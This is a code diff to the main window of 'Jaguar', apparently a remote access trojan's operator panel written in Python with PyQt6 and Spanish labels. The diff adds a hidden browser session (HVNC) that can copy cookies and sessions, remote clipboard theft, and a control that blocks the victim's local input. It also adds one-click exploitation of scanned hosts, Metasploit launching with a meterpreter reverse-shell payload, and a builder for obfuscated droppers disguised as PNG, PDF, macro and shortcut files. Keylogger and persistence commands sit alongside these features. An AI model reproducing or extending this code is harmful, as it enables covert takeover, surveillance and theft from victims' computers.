@@ -1,17 +1,18 @@
 # -*- coding: utf-8 -*-
-"""Ventana principal Jaguar — remote desktop con control de ratón/teclado."""
+"""Ventana principal Jaguar — remote desktop + HVNC + escaner + MSF."""
 
 import base64
 import json
 import os
 import threading
 import time
-from jaguar.common import config, escaner
+
 from PyQt6.QtWidgets import (
     QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QGridLayout, QFrame,
     QPushButton, QTreeWidget, QTreeWidgetItem, QTextEdit, QLabel, QComboBox,
     QSplitter, QMenu, QFileDialog, QInputDialog, QMessageBox, QCheckBox,
-    QDialog, QLineEdit, QPlainTextEdit, QTabWidget, QProgressBar,
+    QDialog, QLineEdit, QPlainTextEdit, QTabWidget, QProgressBar, QSlider,
+    QListWidget, QListWidgetItem, QApplication,
 )
 from PyQt6.QtCore import Qt, pyqtSignal, QTimer
 from PyQt6.QtGui import QAction, QPixmap
@@ -20,7 +21,7 @@ from jaguar.ui.theme import aplicar_tema_rojo_negro, ESTILO_BOTON, TENUE
 from jaguar.ui.logo import obtener_logo, obtener_icono
 from jaguar.server.servidor import Servidor
 from jaguar.common.constants import APP_NAME, APP_VERSION
-from jaguar.common import escaner, exploits, geo
+from jaguar.common import config, escaner, exploits, geo, explotadores
 from jaguar.builder.constructor import Constructor
 
 COLS = ["", "ID", "Host", "Usuario", "SO", "IP", "País", "ISP", "Lat."]
@@ -71,6 +72,8 @@ class TerminalDialog(QDialog):
 
 
 class EscritorioDialog(QDialog):
+    """Escritorio remoto. TODAS las casillas entran DESMARCADAS."""
+
     def __init__(self, cid, nombre, parent=None):
         super().__init__(parent)
         self.cid = cid
@@ -81,23 +84,56 @@ class EscritorioDialog(QDialog):
         self._off_y = 0
         self._capturando = False
         self.setWindowTitle(f"Escritorio — {nombre}")
-        self.resize(1000, 620)
+        self.resize(1000, 660)
         aplicar_tema_rojo_negro(self)
         self.setMouseTracking(True)
 
         lay = QVBoxLayout(self)
         barra = QHBoxLayout()
         self.chk_captura = QCheckBox("Capturar pantalla")
-        self.chk_captura.setChecked(True)
-        self.chk_raton = QCheckBox("Controlar ratón")
-        self.chk_raton.setChecked(False)
-        barra.addWidget(self.chk_captura)
-        barra.addWidget(self.chk_raton)
+        self.chk_control = QCheckBox("Controlar ratón")
+        self.chk_teclado = QCheckBox("Controlar teclado")
+        self.chk_bloqueo = QCheckBox("Bloquear entrada local")
+        for c in (self.chk_captura, self.chk_control, self.chk_teclado, self.chk_bloqueo):
+            c.setChecked(False)                       # <-- DESMARCADAS
+            barra.addWidget(c)
         barra.addStretch()
         self.lbl_info = QLabel("visor")
         self.lbl_info.setStyleSheet(f"color:{TENUE};")
         barra.addWidget(self.lbl_info)
         lay.addLayout(barra)
+
+        barra2 = QHBoxLayout()
+        barra2.addWidget(QLabel("Calidad:"))
+        self.sl_cal = QSlider(Qt.Orientation.Horizontal)
+        self.sl_cal.setRange(20, 90)
+        self.sl_cal.setValue(65)
+        self.sl_cal.setFixedWidth(120)
+        barra2.addWidget(self.sl_cal)
+        barra2.addWidget(QLabel("FPS:"))
+        self.cb_fps = QComboBox()
+        self.cb_fps.addItems(["2", "5", "8", "12", "20"])
+        self.cb_fps.setCurrentText("8")
+        barra2.addWidget(self.cb_fps)
+        barra2.addWidget(QLabel("Escala:"))
+        self.cb_esc = QComboBox()
+        self.cb_esc.addItems(["100%", "75%", "50%"])
+        self.cb_esc.setCurrentText("75%")
+        barra2.addWidget(self.cb_esc)
+        b_full = QPushButton("Pantalla completa")
+        b_full.setStyleSheet(ESTILO_BOTON)
+        b_full.clicked.connect(self._fullscreen)
+        barra2.addWidget(b_full)
+        b_save = QPushButton("Guardar captura")
+        b_save.setStyleSheet(ESTILO_BOTON)
+        b_save.clicked.connect(self._guardar)
+        barra2.addWidget(b_save)
+        b_clip = QPushButton("Traer portapapeles")
+        b_clip.setStyleSheet(ESTILO_BOTON)
+        b_clip.clicked.connect(lambda: self.parent._enviar_comando(self.cid, "clip_get"))
+        barra2.addWidget(b_clip)
+        barra2.addStretch()
+        lay.addLayout(barra2)
 
         self.pantalla = QLabel("activa «Capturar pantalla» para ver el escritorio")
         self.pantalla.setAlignment(Qt.AlignmentFlag.AlignCenter)
@@ -108,16 +144,32 @@ class EscritorioDialog(QDialog):
 
         self.timer = QTimer(self)
         self.timer.timeout.connect(self._tick_captura)
-        self.timer.start(300)
+        self.timer.start(125)
         QTimer.singleShot(150, self._tick_captura)
 
+    def _ms(self):
+        try:
+            return max(125, int(1000 / int(self.cb_fps.currentText())))
+        except Exception:
+            return 200
+
     def _tick_captura(self):
-        if not self.chk_captura.isChecked():
-            return
-        if self._capturando:
+        self.timer.setInterval(self._ms())
+        if not self.chk_captura.isChecked() or self._capturando:
             return
         self._capturando = True
-        self.parent._enviar_comando(self.cid, "captura")
+        esc = int(self.cb_esc.currentText().rstrip("%")) / 100.0
+        self.parent._enviar_comando(self.cid, "captura", {
+            "formato": "jpeg", "calidad": self.sl_cal.value(), "escala": esc})
+
+    def _fullscreen(self):
+        if self.isFullScreen():
+            self.showNormal()
+        else:
+            self.showFullScreen()
+
+    def _guardar(self):
+        self.parent._screenshot(self.cid)
 
     def set_frame(self, pm, w, h):
         self._capturando = False
@@ -134,12 +186,10 @@ class EscritorioDialog(QDialog):
     def _coords(self, pos):
         x = int((pos.x() - self._off_x) / self._esc) if self._esc else 0
         y = int((pos.y() - self._off_y) / self._esc) if self._esc else 0
-        x = max(0, min(self.rem_w, x))
-        y = max(0, min(self.rem_h, y))
-        return x, y
+        return max(0, min(self.rem_w, x)), max(0, min(self.rem_h, y))
 
     def _raton(self, accion, pos=None, extra=None):
-        if not self.chk_raton.isChecked():
+        if not self.chk_control.isChecked():
             return
         args = {"accion": accion}
         if pos is not None:
@@ -151,17 +201,11 @@ class EscritorioDialog(QDialog):
 
     def mousePressEvent(self, e):
         pos = self.pantalla.mapFrom(self, e.position().toPoint())
-        if e.button() == Qt.MouseButton.RightButton:
-            self._raton("right_down", pos)
-        else:
-            self._raton("down", pos)
+        self._raton("right_down" if e.button() == Qt.MouseButton.RightButton else "down", pos)
 
     def mouseReleaseEvent(self, e):
         pos = self.pantalla.mapFrom(self, e.position().toPoint())
-        if e.button() == Qt.MouseButton.RightButton:
-            self._raton("right_up", pos)
-        else:
-            self._raton("up", pos)
+        self._raton("right_up" if e.button() == Qt.MouseButton.RightButton else "up", pos)
 
     def mouseMoveEvent(self, e):
         pos = self.pantalla.mapFrom(self, e.position().toPoint())
@@ -172,11 +216,10 @@ class EscritorioDialog(QDialog):
         self._raton("doble", pos)
 
     def wheelEvent(self, e):
-        delta = 120 if e.angleDelta().y() > 0 else -120
-        self._raton("scroll", extra={"delta": delta})
+        self._raton("scroll", extra={"delta": 120 if e.angleDelta().y() > 0 else -120})
 
     def keyPressEvent(self, e):
-        if not self.chk_raton.isChecked():
+        if not self.chk_teclado.isChecked():
             return
         vk = VK_ESPECIALES.get(e.key())
         if vk:
@@ -185,6 +228,9 @@ class EscritorioDialog(QDialog):
             t = e.text()
             if t:
                 self.parent._enviar_comando(self.cid, "teclado", {"texto": t})
+
+    def toggle_bloqueo(self):
+        self.parent._enviar_comando(self.cid, "bloquear_entrada")
 
     def closeEvent(self, e):
         self.timer.stop()
@@ -196,6 +242,8 @@ class EscritorioDialog(QDialog):
 
 
 class HvncDialog(QDialog):
+    """HVNC. TODAS las casillas entran DESMARCADAS."""
+
     NAVEGADORES = ["chrome", "edge", "brave", "opera", "firefox"]
 
     def __init__(self, cid, nombre, parent=None):
@@ -208,11 +256,11 @@ class HvncDialog(QDialog):
         self._off_y = 0
         self._nav_activo = None
         self.setWindowTitle(f"HVNC — {nombre}")
-        self.resize(1000, 700)
+        self.resize(1000, 720)
         aplicar_tema_rojo_negro(self)
         l = QVBoxLayout(self)
         l.setSpacing(8)
-        l.addWidget(QLabel("Lanzar navegador en segundo plano (arranca oculto, fuera de pantalla):"))
+        l.addWidget(QLabel("Lanzar navegador en segundo plano (oculto, fuera de pantalla):"))
         barra = QHBoxLayout()
         for nav in self.NAVEGADORES:
             b = QPushButton(nav.capitalize())
@@ -220,30 +268,55 @@ class HvncDialog(QDialog):
             b.clicked.connect(lambda _, n=nav: self.iniciar(n))
             barra.addWidget(b)
         barra.addStretch()
-        b_cerrar = QPushButton("⏹  Cerrar navegador")
+        b_cerrar = QPushButton("Cerrar navegador")
         b_cerrar.setStyleSheet(ESTILO_BOTON)
         b_cerrar.clicked.connect(self.cerrar_nav)
         barra.addWidget(b_cerrar)
         l.addLayout(barra)
 
         fila = QHBoxLayout()
-        self.chk_oculto = QCheckBox("Modo oculto (fuera de pantalla)")
-        self.chk_oculto.setChecked(True)
-        fila.addWidget(self.chk_oculto)
+        self.chk_oculto = QCheckBox("Modo oculto")
         self.chk_cookies = QCheckBox("Copiar cookies / sesión")
-        self.chk_cookies.setChecked(True)
-        fila.addWidget(self.chk_cookies)
         self.chk_control = QCheckBox("Control (ratón/teclado)")
-        self.chk_control.setChecked(True)
-        fila.addWidget(self.chk_control)
         self.chk_captura = QCheckBox("Capturar pantalla")
-        self.chk_captura.setChecked(True)
-        fila.addWidget(self.chk_captura)
+        self.chk_shell = QCheckBox("Explorador")
+        self.chk_cmd = QCheckBox("CMD oculto")
+        for c in (self.chk_oculto, self.chk_cookies, self.chk_control,
+                  self.chk_captura, self.chk_shell, self.chk_cmd):
+            c.setChecked(False)                       # <-- DESMARCADAS
+            fila.addWidget(c)
         fila.addStretch()
         self.lbl = QLabel("listo.")
         self.lbl.setStyleSheet(f"color:{TENUE};")
         fila.addWidget(self.lbl)
         l.addLayout(fila)
+
+        fila2 = QHBoxLayout()
+        fila2.addWidget(QLabel("Calidad:"))
+        self.sl_cal = QSlider(Qt.Orientation.Horizontal)
+        self.sl_cal.setRange(20, 90)
+        self.sl_cal.setValue(55)
+        self.sl_cal.setFixedWidth(110)
+        self.sl_cal.valueChanged.connect(self._opciones)
+        fila2.addWidget(self.sl_cal)
+        fila2.addWidget(QLabel("FPS:"))
+        self.cb_fps = QComboBox()
+        self.cb_fps.addItems(["4", "6", "8", "12", "15"])
+        self.cb_fps.setCurrentText("8")
+        self.cb_fps.currentTextChanged.connect(self._opciones)
+        fila2.addWidget(self.cb_fps)
+        fila2.addWidget(QLabel("Escala:"))
+        self.cb_esc = QComboBox()
+        self.cb_esc.addItems(["100%", "75%", "50%"])
+        self.cb_esc.setCurrentText("75%")
+        self.cb_esc.currentTextChanged.connect(self._opciones)
+        fila2.addWidget(self.cb_esc)
+        b_clip = QPushButton("Traer portapapeles")
+        b_clip.setStyleSheet(ESTILO_BOTON)
+        b_clip.clicked.connect(lambda: self.parent._enviar_comando(self.cid, "clip_get"))
+        fila2.addWidget(b_clip)
+        fila2.addStretch()
+        l.addLayout(fila2)
 
         l.addWidget(QLabel("Navegar a URL en el HVNC:"))
         f2 = QHBoxLayout()
@@ -265,19 +338,41 @@ class HvncDialog(QDialog):
 
         self.timer = QTimer(self)
         self.timer.timeout.connect(self._tick_captura)
+        self.timer_estado = QTimer(self)
+        self.timer_estado.timeout.connect(
+            lambda: self.parent._enviar_comando(self.cid, "hvnc_estado"))
+        self.timer_estado.start(1500)
+
+    def _opciones(self):
+        esc = int(self.cb_esc.currentText().rstrip("%")) / 100.0
+        self.parent._enviar_comando(self.cid, "hvnc_opciones", {
+            "calidad": self.sl_cal.value(),
+            "escala": esc,
+            "fps": int(self.cb_fps.currentText())})
 
     def iniciar(self, nav):
         self._nav_activo = nav
         self.parent._enviar_comando(self.cid, "hvnc_iniciar", {
             "navegador": nav,
             "copiar_sesion": self.chk_cookies.isChecked(),
-            "oculto": self.chk_oculto.isChecked()})
+            "oculto": self.chk_oculto.isChecked(),
+            "shell": self.chk_shell.isChecked(),
+            "cmd": self.chk_cmd.isChecked()})
         self.lbl.setText(f"lanzando {nav}...")
-        self.timer.start(500)
+        self._opciones()
+        self.timer.start(1000 // max(1, int(self.cb_fps.currentText())))
 
     def _tick_captura(self):
         if self.chk_captura.isChecked():
             self.parent._enviar_comando(self.cid, "hvnc_captura")
+
+    def set_estado(self, datos):
+        est = datos.get("estado")
+        err = datos.get("error")
+        if err:
+            self.lbl.setText(f"ERROR: {err}")
+        elif est:
+            self.lbl.setText(str(est))
 
     def cerrar_nav(self):
         nav = self._nav_activo or "chrome"
@@ -290,7 +385,8 @@ class HvncDialog(QDialog):
         url = self.in_url.text().strip()
         if url:
             self.parent._enviar_comando(self.cid, "hvnc_navegar",
-                                        {"navegador": self._nav_activo or "chrome", "url": url})
+                                        {"navegador": self._nav_activo or "chrome",
+                                         "url": url})
 
     def set_frame(self, pm, w, h):
         if pm.isNull():
@@ -353,6 +449,7 @@ class HvncDialog(QDialog):
 
     def closeEvent(self, e):
         self.timer.stop()
+        self.timer_estado.stop()
         try:
             self.parent.hvnc_por_cid.get(self.cid, []).remove(self)
         except ValueError:
@@ -376,7 +473,6 @@ class WebcamDialog(QDialog):
         self.lbl = QLabel("")
         self.lbl.setStyleSheet(f"color:{TENUE};")
         l.addWidget(self.lbl)
-
         parent._enviar_comando(cid, "webcam_iniciar", {"cam": 0})
         self.timer = QTimer(self)
         self.timer.timeout.connect(lambda: parent._enviar_comando(cid, "webcam_frame"))
@@ -408,6 +504,7 @@ class MainWindow(QMainWindow):
     _sig_geo = pyqtSignal(str, dict)
     _sig_msf = pyqtSignal(str)
     _sig_builder = pyqtSignal(str)
+    _sig_nativo = pyqtSignal(str)
 
     def __init__(self):
         super().__init__()
@@ -432,7 +529,9 @@ class MainWindow(QMainWindow):
         self.webcams_por_cid = {}
         self._pings = {}
         self._screenshot_pend = {}
+        self._clip_pend = {}
         self.msf = None
+        self._mods_msf = []
 
         self._sig_log.connect(self._log)
         self._sig_escaneo_fin.connect(self._on_escaneo_fin)
@@ -440,12 +539,14 @@ class MainWindow(QMainWindow):
         self._sig_geo.connect(self._aplicar_geo)
         self._sig_msf.connect(self._append_msf)
         self._sig_builder.connect(self._on_builder_log)
+        self._sig_nativo.connect(self._append_nativo)
 
         self._build_ui()
         self._ping_timer = QTimer(self)
         self._ping_timer.timeout.connect(self._ping_todos)
         self._ping_timer.start(3000)
 
+    # ================================================================= UI
     def _build_ui(self):
         central = QWidget()
         self.setCentralWidget(central)
@@ -584,6 +685,10 @@ class MainWindow(QMainWindow):
         self.btn_rec.setStyleSheet(ESTILO_BOTON)
         self.btn_rec.clicked.connect(self._recomendar_desde_escaneo)
         fila.addWidget(self.btn_rec)
+        self.btn_nativo = QPushButton("⚡  Explotar (nativo)")
+        self.btn_nativo.setStyleSheet(ESTILO_BOTON)
+        self.btn_nativo.clicked.connect(self._explotar_nativo)
+        fila.addWidget(self.btn_nativo)
         fila.addStretch()
         l.addLayout(fila)
         self.barra = QProgressBar()
@@ -596,6 +701,10 @@ class MainWindow(QMainWindow):
         self.res_escaner.setAlternatingRowColors(True)
         self.res_escaner.setRootIsDecorated(False)
         l.addWidget(self.res_escaner, 1)
+        self.out_nativo = QPlainTextEdit()
+        self.out_nativo.setReadOnly(True)
+        self.out_nativo.setFixedHeight(120)
+        l.addWidget(self.out_nativo)
         return w
 
     def _tab_exploits(self):
@@ -617,8 +726,12 @@ class MainWindow(QMainWindow):
         b2 = QPushButton("📋  Copiar comando")
         b2.setStyleSheet(ESTILO_BOTON)
         b2.clicked.connect(self._copiar_exploit)
+        b3 = QPushButton("🛰  Copiar comando MSF")
+        b3.setStyleSheet(ESTILO_BOTON)
+        b3.clicked.connect(self._copiar_exploit_msf)
         fila.addWidget(b1)
         fila.addWidget(b2)
+        fila.addWidget(b3)
         fila.addStretch()
         l.addLayout(fila)
         return w
@@ -646,18 +759,31 @@ class MainWindow(QMainWindow):
         self.in_msf_pass.setEchoMode(QLineEdit.EchoMode.Password)
         form.addWidget(self.in_msf_pass, 1, 3)
         l.addLayout(form)
+
         fila = QHBoxLayout()
         for txt, fn in [("🔌  Conectar", self._msf_conectar),
+                        ("🧩  Cargar TODOS los exploits", self._msf_cargar_exploits),
                         ("📋  Sesiones", self._msf_sesiones),
-                        ("🛰  Jobs", self._msf_jobs),
-                        ("🧩  Módulos", self._msf_modulos)]:
+                        ("🛰  Jobs", self._msf_jobs)]:
             b = QPushButton(txt)
             b.setStyleSheet(ESTILO_BOTON)
             b.clicked.connect(fn)
             fila.addWidget(b)
         fila.addStretch()
         l.addLayout(fila)
-        l.addWidget(QLabel("Lanzar módulo:"))
+
+        fbusq = QHBoxLayout()
+        fbusq.addWidget(QLabel("Filtrar exploits:"))
+        self.in_filtro_msf = QLineEdit()
+        self.in_filtro_msf.setPlaceholderText("p.ej. smb, eternalblue, apache...")
+        self.in_filtro_msf.textChanged.connect(self._filtrar_msf)
+        fbusq.addWidget(self.in_filtro_msf)
+        l.addLayout(fbusq)
+        self.lista_mods = QListWidget()
+        self.lista_mods.setFixedHeight(140)
+        self.lista_mods.itemDoubleClicked.connect(self._elegir_modulo)
+        l.addWidget(self.lista_mods)
+
         f2 = QGridLayout()
         f2.setHorizontalSpacing(8)
         f2.addWidget(QLabel("Tipo:"), 0, 0)
@@ -674,9 +800,16 @@ class MainWindow(QMainWindow):
         self.in_msf_rport = QLineEdit()
         self.in_msf_rport.setFixedWidth(90)
         f2.addWidget(self.in_msf_rport, 1, 3)
-        f2.addWidget(QLabel("PAYLOAD:"), 2, 0)
+        f2.addWidget(QLabel("LHOST:"), 2, 0)
+        self.in_msf_lhost = QLineEdit()
+        f2.addWidget(self.in_msf_lhost, 2, 1)
+        f2.addWidget(QLabel("LPORT:"), 2, 2)
+        self.in_msf_lport = QLineEdit("4444")
+        self.in_msf_lport.setFixedWidth(90)
+        f2.addWidget(self.in_msf_lport, 2, 3)
+        f2.addWidget(QLabel("PAYLOAD:"), 3, 0)
         self.in_msf_payload = QLineEdit("windows/x64/meterpreter/reverse_tcp")
-        f2.addWidget(self.in_msf_payload, 2, 1, 1, 3)
+        f2.addWidget(self.in_msf_payload, 3, 1, 1, 3)
         l.addLayout(f2)
         b_run = QPushButton("▶  Ejecutar módulo")
         b_run.setStyleSheet(ESTILO_BOTON)
@@ -736,21 +869,19 @@ class MainWindow(QMainWindow):
         self.btn_ip_pub = QPushButton("🌍 IP pública")
         self.btn_ip_pub.setStyleSheet(ESTILO_BOTON)
         self.btn_ip_pub.clicked.connect(self._detectar_ip_publica)
-
+        form.addWidget(self.btn_ip_pub, 0, 2)
         self.btn_ddns = QPushButton("🌐 DDNS")
         self.btn_ddns.setStyleSheet(ESTILO_BOTON)
         self.btn_ddns.clicked.connect(lambda: self.in_bhost.setText(config.cargar()["host"]))
         form.addWidget(self.btn_ddns, 0, 3)
-
-        form.addWidget(self.btn_ip_pub, 0, 2)
-        form.addWidget(QLabel("Puerto:"), 1, 0)
+        form.addWidget(QLabel("Puerto agente:"), 1, 0)
         self.in_bpuerto = QLineEdit(str(cfg["puerto"]))
         self.in_bpuerto.setFixedWidth(90)
         form.addWidget(self.in_bpuerto, 1, 1, Qt.AlignmentFlag.AlignLeft)
-        self.btn_probar = QPushButton("Probar")
-        self.btn_probar.setStyleSheet(ESTILO_BOTON)
-        self.btn_probar.clicked.connect(self._probar_conexion)
-        form.addWidget(self.btn_probar, 1, 2, 1, 2)
+        form.addWidget(QLabel("Puerto HTTP droppers:"), 1, 2)
+        self.in_bhttp = QLineEdit("8080")
+        self.in_bhttp.setFixedWidth(90)
+        form.addWidget(self.in_bhttp, 1, 3, Qt.AlignmentFlag.AlignLeft)
         l.addLayout(form)
         self.in_bhost.editingFinished.connect(self._guardar_config)
         self.in_bpuerto.editingFinished.connect(self._guardar_config)
@@ -779,7 +910,7 @@ class MainWindow(QMainWindow):
         form3.addWidget(QLabel("Compilador:"))
         self.in_bcomp = QComboBox()
         self.in_bcomp.addItems(["pyinstaller", "auto", "nuitka"])
-        self.in_bcomp.setToolTip("pyinstaller = rapido (sin compilar C) | auto = Nuitka si esta | nuitka = forzar")
+        self.in_bcomp.setToolTip("pyinstaller = rapido | auto = Nuitka si esta | nuitka = forzar")
         form3.addWidget(self.in_bcomp)
         self.chk_pyarmor = QCheckBox("Ofuscar con PyArmor")
         self.chk_pyarmor.setChecked(True)
@@ -793,7 +924,8 @@ class MainWindow(QMainWindow):
             (".bat", lambda: self._build_uno("bat")), (".vbs", lambda: self._build_uno("vbs")),
             (".ps1", lambda: self._build_uno("ps1")), (".lnk", lambda: self._build_uno("lnk")),
             (".png polyglot", lambda: self._build_uno("png")),
-            (".pdf", lambda: self._build_uno("pdf")), ("macro .bas", lambda: self._build_uno("macro")),
+            (".pdf polyglot", lambda: self._build_uno("pdf")),
+            ("macro .bas", lambda: self._build_uno("macro")),
             (".hta", lambda: self._build_uno("hta")), ("🌐 Servir dist", self._servir_dist),
         ]
         for i, (t, fn) in enumerate(botones):
@@ -817,7 +949,7 @@ class MainWindow(QMainWindow):
         l.addWidget(self.log_text, 1)
         return w
 
-    # ------------------------------------------------------------------
+    # ================================================================= servidor
     def _toggle_servidor(self):
         if self.servidor_activo:
             self.servidor.detener()
@@ -896,14 +1028,22 @@ class MainWindow(QMainWindow):
         if cmd == "hvnc_captura" and ok:
             self._enrutar_hvnc(cid, datos or {})
             return
+        if cmd == "hvnc_estado" and ok:
+            for dlg in self.hvnc_por_cid.get(cid, []):
+                dlg.set_estado(datos or {})
+            return
         if cmd == "webcam_frame" and ok:
             self._enrutar_webcam(cid, datos or {})
+            return
+        if cmd == "clip_get" and ok:
+            QApplication.clipboard().setText((datos or {}).get("texto", ""))
+            self._log(f"[{cid[:8]}] portapapeles remoto copiado")
             return
         self._log(f"[{cid[:8]}] '{cmd}' -> {'OK' if ok else 'ERROR'}")
         if ok and cmd == "captura":
             self._enrutar_frame(cid, datos or {})
         if cmd in ("hvnc_iniciar", "hvnc_cerrar", "hvnc_navegar",
-                   "webcam_iniciar", "webcam_parar"):
+                   "webcam_iniciar", "webcam_parar", "hvnc_opciones", "bloquear_entrada"):
             return
         for dlg in self.dialogs_por_cid.get(cid, []):
             if not ok:
@@ -918,6 +1058,9 @@ class MainWindow(QMainWindow):
     def _on_builder_log(self, t):
         if hasattr(self, "out_builder") and self.out_builder is not None:
             self.out_builder.appendPlainText(t)
+
+    def _append_nativo(self, t):
+        self.out_nativo.appendPlainText(t)
 
     def _refrescar_conteo(self):
         self.lbl_n.setText(str(len(self.clientes)))
@@ -946,7 +1089,7 @@ class MainWindow(QMainWindow):
             self._pings[cid] = ts
             self.servidor.enviar_comando(cid, "ping", {"ts": ts})
 
-    # ------------------------------------------------------------------
+    # ================================================================= contexto
     def _menu_contexto(self, pos):
         it = self.tree.itemAt(pos)
         if not it:
@@ -967,6 +1110,9 @@ class MainWindow(QMainWindow):
             ("⌨️  Keylogger iniciar", lambda: self._enviar_comando(cid, "keylogger_iniciar")),
             ("📜  Keylogger leer", lambda: self._enviar_comando(cid, "keylogger_leer")),
             ("🔓  Persistencia", lambda: self._enviar_comando(cid, "persistir")),
+            ("📋  Portapapeles: traer", lambda: self._enviar_comando(cid, "clip_get")),
+            ("📥  Portapapeles: enviar", lambda: self._pedir_y(cid, "clip_set", "Texto", "")),
+            ("🔒  Bloquear/Desbloquear entrada", lambda: self._enviar_comando(cid, "bloquear_entrada")),
             ("🌍  Iniciar proxy SOCKS5 (:1080)", lambda: self._enviar_comando(cid, "proxy_iniciar", {"puerto": 1080})),
             ("🌍  Parar proxy SOCKS5", lambda: self._enviar_comando(cid, "proxy_parar")),
             ("🌐  Abrir URL", lambda: self._pedir_y(cid, "abrir_url", "URL", "https://")),
@@ -985,14 +1131,15 @@ class MainWindow(QMainWindow):
         if cid not in self.clientes:
             return
         self.servidor.enviar_comando(cid, cmd, args or {})
-        if cmd not in ("raton", "teclado", "ping",
-                       "hvnc_raton", "hvnc_captura", "webcam_frame"):
+        if cmd not in ("raton", "teclado", "ping", "hvnc_raton", "hvnc_captura",
+                       "webcam_frame", "captura", "hvnc_estado"):
             self._log(f"[→] '{cmd}' a {cid[:8]}")
 
     def _pedir_y(self, cid, cmd, etiqueta, defecto):
         texto, ok = QInputDialog.getText(self, cmd, etiqueta + ":", text=defecto)
         if ok:
-            clave = {"listar_dir": "ruta", "abrir_url": "url", "mensaje": "texto"}[cmd]
+            clave = {"listar_dir": "ruta", "abrir_url": "url",
+                     "mensaje": "texto", "clip_set": "texto"}[cmd]
             self._enviar_comando(cid, cmd, {clave: texto})
 
     def _abrir_terminal(self, cid):
@@ -1036,10 +1183,12 @@ class MainWindow(QMainWindow):
                 self._log(f"[screenshot] error: {e}")
         for dlg in self.escritorios_por_cid.get(cid, []):
             try:
-                raw = base64.b64decode(b64)
                 pm = QPixmap()
-                pm.loadFromData(raw)
-                dlg.set_frame(pm, datos.get("w", 1920), datos.get("h", 1080))
+                pm.loadFromData(base64.b64decode(b64))
+                if not pm.isNull():
+                    dlg.set_frame(pm, datos.get("w", 1920), datos.get("h", 1080))
+                else:
+                    dlg._capturando = False
             except Exception:
                 pass
 
@@ -1047,6 +1196,8 @@ class MainWindow(QMainWindow):
         for dlg in self.hvnc_por_cid.get(cid, []):
             try:
                 raw = base64.b64decode(datos.get("b64", ""))
+                if not raw:
+                    continue
                 pm = QPixmap()
                 pm.loadFromData(raw)
                 dlg.set_frame(pm, datos.get("w", 1200), datos.get("h", 800))
@@ -1072,7 +1223,7 @@ class MainWindow(QMainWindow):
         carpeta = os.path.join(os.path.expanduser("~"), "JaguarScreenshots")
         os.makedirs(carpeta, exist_ok=True)
         self._screenshot_pend[cid] = carpeta
-        self._enviar_comando(cid, "captura")
+        self._enviar_comando(cid, "captura", {"formato": "png"})
 
     def _subir_ejecutar(self, cid):
         ruta, _ = QFileDialog.getOpenFileName(self, "Subir y ejecutar")
@@ -1083,7 +1234,7 @@ class MainWindow(QMainWindow):
         self._enviar_comando(cid, "subir_ejecutar",
                              {"nombre": os.path.basename(ruta), "b64": b64})
 
-    # ------------------------------------------------------------------
+    # ================================================================= escaner
     def _escanear(self):
         objetivo = self.in_objetivo.text().strip()
         puertos = self.in_puertos.text().strip()
@@ -1112,6 +1263,20 @@ class MainWindow(QMainWindow):
                                 [d["ip"], d.get("host", ""), str(p["puerto"]),
                                  p["servicio"], p.get("banner", "")])
         self._log(f"[escáner] {len(res)} host(s) con puertos abiertos")
+
+    def _explotar_nativo(self):
+        it = self.res_escaner.currentItem()
+        if not it:
+            QMessageBox.information(self, "Nativo", "Selecciona un puerto escaneado.")
+            return
+        ip, puerto = it.text(0), int(it.text(2))
+        self.out_nativo.appendPlainText(f"[*] explotando {ip}:{puerto} ...")
+
+        def worker():
+            r = explotadores.explotar(ip, puerto, lhost=escaner.ip_local())
+            self._sig_nativo.emit(
+                f"[{r.metodo}] ok={r.ok}\n{r.salida or r.error}\n")
+        threading.Thread(target=worker, daemon=True).start()
 
     def _recomendar_desde_escaneo(self):
         recs = exploits.recomendar(self.ultimo_escaneo)
@@ -1147,11 +1312,17 @@ class MainWindow(QMainWindow):
     def _copiar_exploit(self):
         r = self._rec_actual()
         if r:
-            from PyQt6.QtWidgets import QApplication
             QApplication.clipboard().setText(exploits.comando_para(r))
             self._log("[exploits] comando copiado")
 
-    # ------------------------------------------------------------------ msf
+    def _copiar_exploit_msf(self):
+        r = self._rec_actual()
+        if r:
+            QApplication.clipboard().setText(
+                exploits.comando_msf(r, lhost=escaner.ip_local()))
+            self._log("[exploits] comando MSF copiado")
+
+    # ================================================================= msf
     def _msf_cliente(self):
         if self.msf is None:
             from jaguar.common.msf_rpc import MsfRpc
@@ -1180,23 +1351,36 @@ class MainWindow(QMainWindow):
             self._sig_msf.emit(f"[msf] version: {m.version()}")
         self._msf_tarea(fn)
 
+    def _msf_cargar_exploits(self):
+        def fn():
+            mods = self._msf_cliente().modulos("exploit")
+            self._mods_msf = sorted(mods)
+            self._filtrar_msf(self.in_filtro_msf.text())
+            self._sig_msf.emit(f"[msf] {len(self._mods_msf)} exploits cargados (todos)")
+        self._msf_tarea(fn)
+
+    def _filtrar_msf(self, texto):
+        texto = (texto or "").lower()
+        self.lista_mods.clear()
+        for m in self._mods_msf:
+            if texto in m.lower():
+                self.lista_mods.addItem(QListWidgetItem(m))
+
+    def _elegir_modulo(self, item):
+        self.in_msf_modulo.setText("exploit/" + item.text())
+        self.in_msf_tipo.setCurrentText("exploit")
+
     def _msf_sesiones(self):
         def fn():
             r = self._msf_cliente().sesiones()
-            self._sig_msf.emit("[msf] sesiones:\n" + json.dumps(r, indent=2, ensure_ascii=False, default=str))
+            self._sig_msf.emit("[msf] sesiones:\n" + json.dumps(r, indent=2,
+                                                               ensure_ascii=False, default=str))
         self._msf_tarea(fn)
 
     def _msf_jobs(self):
         def fn():
             r = self._msf_cliente().trabajos()
             self._sig_msf.emit("[msf] jobs: " + json.dumps(r, ensure_ascii=False, default=str))
-        self._msf_tarea(fn)
-
-    def _msf_modulos(self):
-        def fn():
-            tipo = self.in_msf_tipo.currentText()
-            r = self._msf_cliente().modulos(tipo)
-            self._sig_msf.emit(f"[msf] {len(r)} módulos {tipo} cargados")
         self._msf_tarea(fn)
 
     def _msf_ejecutar(self):
@@ -1206,6 +1390,10 @@ class MainWindow(QMainWindow):
                 opts["RHOSTS"] = self.in_msf_rhosts.text().strip()
             if self.in_msf_rport.text().strip():
                 opts["RPORT"] = int(self.in_msf_rport.text())
+            if self.in_msf_lhost.text().strip():
+                opts["LHOST"] = self.in_msf_lhost.text().strip()
+            if self.in_msf_lport.text().strip():
+                opts["LPORT"] = int(self.in_msf_lport.text())
             if self.in_msf_payload.text().strip():
                 opts["PAYLOAD"] = self.in_msf_payload.text().strip()
             r = self._msf_cliente().ejecutar_modulo(
@@ -1213,7 +1401,7 @@ class MainWindow(QMainWindow):
